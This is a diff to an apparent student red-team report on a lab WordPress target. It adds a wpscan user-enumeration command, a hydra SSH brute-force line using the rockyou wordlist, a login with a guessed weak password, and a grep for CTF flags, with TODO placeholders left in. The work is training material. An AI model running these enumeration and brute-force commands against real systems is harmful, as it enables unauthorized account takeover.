@@ -46,9 +46,19 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - WPScan to enumerate users of target1 WordPress site.
       - wpscan --url http://192.168.1.110 --enumerate u
-       <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wpscan_michael.png?raw=true" alt="WPScan Users"/>  
-      - Brute force guess or hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh  
-      - _TODO: Include the command run_
+       <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wpscan_michael.png?raw=true" alt="WPScan Users"/>      
+      - Brute force, guess, or hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh  
+      - _TODO: Include the command run_  guess Password `michael` for user michael.    
+      ssh michael@192.168.1.110  
+      pwd: michael  
+<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/michael_ID.png?raw=true" alt="michael_ID"/>  
+  - egrep flag* service.html
+<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/FLAG-1_service-html.png?raw=true" alt="Flag1"/>  
+
+<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/service-htmp-footer-flag1.png?raw=true" alt src="source.html" style="height: 400px; width:600px;"/>
+
+
+
   - `Flag2: fc3fd58dcdad9ab23faca6e9a3e581c` _hash value_  
     - **Exploit Used**
       - _TODO: Identify the exploit used_
